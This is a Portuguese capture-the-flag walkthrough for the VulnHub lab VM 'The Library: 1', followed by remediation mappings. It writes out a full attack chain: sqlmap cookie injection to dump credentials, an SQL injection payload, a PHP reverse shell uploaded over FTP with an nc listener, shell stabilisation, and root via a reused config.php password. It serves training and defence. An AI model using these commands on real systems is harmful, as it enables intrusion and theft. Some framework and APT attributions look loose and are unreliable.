# The Library: 1 — Os Livros Guardam as Chaves

Mano, olha esse aqui. Uma máquina com tema de biblioteca onde o "catálogo" é um cookie injetável via SQL e as "prateleiras" escondem o caminho de escalação num arquivo PHP de config. The Library: 1 prova que os armazenamentos de dados mais simples podem abrir as portas mais fundas. Sem mentira, a cadeia de injeção via cookie aqui é material de livro didático que aparece constantemente em avaliações web reais. Máquina top demais.

| Campo | Valor |
|---|---|
| **Nível** | Iniciante |
| **VM Alvo** | The Library: 1 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/the-library-1,307/ |
| **Técnicas** | Enumeração de serviços Nmap, descoberta de conteúdo web dirb, interceptação de cookie Burp Suite, SQL injection sqlmap, upload de shell via FTP, escalação por reuso de senha |
| **CVEs** | CWE-89 (SQL Injection via parâmetro cookie), CWE-434 (Upload PHP irrestrito via FTP), CWE-522 (Credenciais insuficientemente protegidas em config PHP) |
| **Grupos APT** | APT41: usa SQL injection como vetor principal de acesso inicial em aplicações web; FIN7: aproveita especificamente padrões de reuso de credenciais (senhas de config de banco de dados) para escalação de privilégios pós-acesso inicial |

---

## Resumo do Ataque

```
nmap → portas 21 (FTP), 22 (SSH), 80 (HTTP)
  → HTTP: aplicação web com páginas PHP
  → dirb → página PHP oculta com formulário de login
  → Burp Suite: interceptar requisição → parâmetro cookie
  → sqlmap: injetar cookie → dump de credenciais FTP
  → FTP: login → upload PHP reverse shell para web root
  → HTTP: acionar shell → www-data
  → estabilização do shell (python pty + stty)
  → /var/www/html/config.php → senha do banco de dados
  → su root (reuso de senha) → uid=0(root)
  → /root/flag.txt
```

---

## Metodologia

1. Descoberta de rede e varredura completa de portas
2. Descoberta de conteúdo web com dirb para encontrar páginas PHP ocultas
3. Interceptação de parâmetro cookie com Burp Suite para identificar ponto de injeção
4. SQL injection via sqlmap para dump de credenciais FTP
5. Login FTP com credenciais obtidas; upload de PHP reverse shell
6. Execução de reverse shell e estabilização
7. Revisão de arquivo de configuração revelando senha reutilizada
8. Acesso root via `su` com senha de banco de dados reutilizada

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.103

nmap -sV -sC -p- 192.168.1.103
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.x
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Três serviços. FTP numa máquina CTF quase sempre significa algo acessível. HTTP é a superfície principal de ataque. SSH é o objetivo final.

**MITRE ATT&CK:** T1046 — Descoberta de Serviço de Rede

---

## Passo 2 — Descoberta de Conteúdo Web

Acesse `http://192.168.1.103/`. Execute brute-force de diretórios:

```bash
dirb http://192.168.1.103/ /usr/share/wordlists/dirb/common.txt
# Alternativa:
gobuster dir -u http://192.168.1.103/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 40
```

Descubra páginas PHP ocultas. Uma delas conterá um formulário de login.

**Nota real:** Páginas admin e login ocultas descobertas via brute-force de diretórios são um achado extremamente comum em avaliações web. Muitos desenvolvedores assumem que "segurança por obscuridade" é suficiente. dirb e gobuster localizam essas páginas consistentemente.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Identificação de Injeção no Cookie

Acesse a página PHP descoberta. Faça login com qualquer credencial de teste. Intercepte a requisição no Burp Suite:

```
GET /book.php?bookisbn=1 HTTP/1.1
Host: 192.168.1.103
Cookie: book=1
```

O parâmetro cookie `book` é controlado pelo usuário e passado diretamente para o banco de dados. Isso é uma injeção SQL às cegas clássica: sem sanitização de cláusula WHERE, sem prepared statements.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público

---

## Passo 4 — SQL Injection via sqlmap

Use sqlmap contra o parâmetro cookie para dump do banco de dados:

```bash
sqlmap -u "http://192.168.1.103/book.php?bookisbn=1" \
  --cookie="book=1" \
  --level=3 \
  --risk=2 \
  --dbs
```

Enumere bancos de dados, depois tabelas, depois faça dump de credenciais:

```bash
sqlmap -u "http://192.168.1.103/book.php?bookisbn=1" \
  --cookie="book=1" \
  -D <nome_banco> \
  --tables

sqlmap -u "http://192.168.1.103/book.php?bookisbn=1" \
  --cookie="book=1" \
  -D <nome_banco> \
  -T <nome_tabela> \
  --dump
```

Recupere credenciais FTP: tipicamente algo como `admin:password` ou similar.

**Alternativa:** Injeção manual via Burp Repeater com padrões `' OR 1=1-- -` para confirmar injeção antes de automatizar com sqlmap.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1552.001 — Credenciais em Arquivos

---

## Passo 5 — Acesso FTP e Upload de Reverse Shell

Faça login no FTP com as credenciais obtidas:

```bash
ftp 192.168.1.103
# Usuário: <usuario_recuperado>
# Senha: <senha_recuperada>

ftp> ls -la
ftp> pwd
```

O FTP tem acesso de escrita ao web root (`/var/www/html/`). Faça upload de um PHP reverse shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edite LHOST e LPORT no shell.php

ftp> put shell.php shell.php
ftp> quit
```

Inicie o listener:

```bash
nc -lvnp 4444
```

Acione o shell:

```bash
curl http://192.168.1.103/shell.php
```

**Nota real:** Acesso de escrita FTP ao web root é uma configuração incorreta crítica: qualquer usuário FTP autenticado pode implantar um webshell. APT41 ataca especificamente vetores de upload de arquivos voltados para web para estabelecer pontos de entrada iniciais em ambientes comprometidos.

**MITRE ATT&CK:** T1021.003 — Serviços Remotos: FTP; T1505.003 — Web Shell

---

## Passo 6 — Estabilização do Shell

Após o callback netcat:

```bash
# Na vítima:
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# No atacante: Ctrl+Z, depois:
stty raw -echo; fg
# Pressione Enter duas vezes
```

Agora você tem um shell totalmente interativo como `www-data`.

**MITRE ATT&CK:** T1059.004 — Interpretador de Script e Comando: Shell Unix

---

## Passo 7 — Descoberta de Credenciais em Arquivo de Configuração

Enumere o web root em busca de arquivos de configuração:

```bash
find /var/www/html -name "*.php" -o -name "*.conf" -o -name "*.cfg" 2>/dev/null
cat /var/www/html/config.php
```

O arquivo de configuração do banco de dados contém uma senha em texto puro. Tente-a para root:

```bash
su root
# Digite a senha do banco de dados
id
# uid=0(root) gid=0(root) groups=0(root)
```

Reuso de senha: a senha do banco de dados e a senha root são idênticas. Este é um dos padrões de escalação de privilégios mais comuns em ambientes reais.

**Nota real:** FIN7 enumera especificamente arquivos de configuração de aplicações web pós-acesso inicial como seu primeiro passo de movimento lateral. Arquivos de config de banco de dados (`config.php`, `wp-config.php`, `database.yml`) quase sempre contêm credenciais em texto puro.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1548.003 — Abuso de Controle de Elevação: su

---

## Passo 8 — Captura da Flag

```bash
cat /root/flag.txt
ls /root/
```

(☞ﾟヮﾟ)☞ Root. A Biblioteca é sua, rapaziada.

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial FTP | obtida via sqlmap | tabela do banco de dados | acesso upload FTP |
| Senha config DB | /var/www/html/config.php | texto puro em PHP | su root (reuso de senha) |
| Flag root | flag.txt | /root/flag.txt | conclusão |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | SQL injection via parâmetro cookie | Injeção via cookie é consistentemente subestimada: desenvolvedores sanitizam inputs de formulários mas esquecem cookies e headers | Teste TODOS os parâmetros controlados pelo usuário: cookies, headers, fragmentos de URL, não apenas campos de formulário |
| 2 | Acesso FTP de escrita ao web root | Qualquer usuário FTP que possa escrever no web root pode implantar um webshell; isso é um erro de configuração | Aplique chroot jail em todos os usuários FTP; web root não deve ser gravável via FTP; prefira SFTP com autenticação por chave |
| 3 | Credenciais em texto puro em arquivo de configuração | Credenciais em arquivos PHP de configuração são o achado mais comum em avaliações web | Use variáveis de ambiente ou gerenciadores de segredos; nunca armazene credenciais em arquivos acessíveis pela web |
| 4 | Reuso de senha entre serviços | Senha do banco de dados = senha root = ponto único de falha para todo o sistema | Aplique senhas únicas por serviço; use PAM ou cofres para gerenciamento de credenciais de sistema |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviço de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Execução | Persistência | Web Shell | T1505.003 |
| Execução | Execução | Shell Unix | T1059.004 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos FTP | T1021.003 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: su | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Parametrize todas as queries SQL** — sem concatenação de strings com input controlado pelo usuário; use prepared statements em toda interação PHP/MySQL
2. **Remova acesso de escrita FTP ao web root** — aplique chroot nos usuários FTP para diretórios de upload fora do web root; migre para SFTP com autenticação por chave
3. **Encripte ou externalize credenciais do banco de dados** — armazene em variáveis de ambiente ou gerenciador de segredos; nunca em arquivos PHP acessíveis pela web
4. **Aplique senhas únicas por serviço** — sem reuso de senha entre banco de dados, FTP e contas do sistema
5. **Desative FTP em texto puro** — FTP transmite credenciais em cleartext; migre para SFTP ou FTPS

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar serviços FTP e arquivos PHP de configuração voltados para web |
| Proteger | Controle de Acesso | Queries parametrizadas; chroot FTP; senhas únicas por serviço |
| Proteger | Segurança de Dados | Gerenciador de segredos para credenciais de banco de dados |
| Detectar | Anomalias e Eventos | Alertar sobre uploads FTP no web root; padrões SQL anômalos |
| Responder | Planejamento de Resposta | Remover webshells; rotacionar credenciais; corrigir injeção |
| Recuperar | Planejamento de Recuperação | Reconstruir a partir de snapshot conhecido; rotacionar senhas |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-10 | Validação de Input de Informação | Queries parametrizadas para todo SQL; validação de input em cookies |
| AC-3 | Aplicação de Acesso | Usuários FTP restritos a chroot; sem acesso de escrita ao web root |
| IA-5 | Gerenciamento de Autenticador | Senhas únicas por serviço; rotacionar após comprometimento |
| SC-28 | Proteção de Informação em Repouso | Sem credenciais em texto puro em arquivos de configuração acessíveis pela web |
| CM-7 | Funcionalidade Mínima | Desativar FTP em texto puro; restringir FTP a somente leitura se necessário |

### CISA KEV

SQL injection (CWE-89) e upload irrestrito de arquivos (CWE-434) estão listados nas classes de vulnerabilidades mais exploradas da CISA. A Diretiva Operacional Vinculante 22-01 da CISA exige remediação imediata de vulnerabilidades de SQL injection em sistemas federais. Organizações devem tratar esses achados como críticos que requerem atenção imediata.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Consciência Situacional (SITUATION) | Realizar Registro de Logs | MIL2 |

### MITRE D3FEND

- **D3-IVA** — Validação de Input (queries parametrizadas previnem SQL injection)
- **D3-ACH** — Hardening de Configuração de Aplicação (chroot FTP; sem escrita no web root)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (senhas únicas por serviço)

---

## Considerações Finais

The Library: 1 entrega uma cadeia limpa e didática: injete o cookie, faça dump das credenciais, suba um shell, reutilize a senha. Cada passo é uma classe de vulnerabilidade real que aparece constantemente em avaliações de produção. A máquina é bem projetada para iniciantes que precisam internalizar que cadeias de ataque são sobre encadear pequenas vitórias, não um único exploit mágico.

A injeção no cookie é o passo mais subestimado. Treine-se para testar todos os parâmetros, não apenas inputs de formulários. Esse hábito, sozinho, vai encontrar mais vulnerabilidades do que qualquer ferramenta individual.

Thanks guys!! (❍ᴥ❍ʋ)
